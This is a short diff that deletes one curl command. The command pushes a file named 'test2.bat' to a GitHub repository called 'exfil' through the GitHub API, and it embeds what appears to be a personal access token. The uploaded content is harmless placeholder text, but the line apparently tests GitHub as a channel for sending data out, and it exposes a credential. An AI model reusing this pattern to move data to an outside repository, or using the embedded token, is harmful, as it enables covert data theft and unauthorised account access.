@@ -1,1 +1,0 @@
-curl -X PUT -H "Authorization: token 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" https://api.github.com/repos/crazyman50000/exfil/contents/test2.bat --data-raw "{\"message\":\"my commit message 3\",\"committer\":{\"name\":\"Monalisa Octocat\",\"email\":\"octocat@github.com\"},\"content\":\"bXkgbmV3IGZpbGUgY29udGVudHM=\"}"
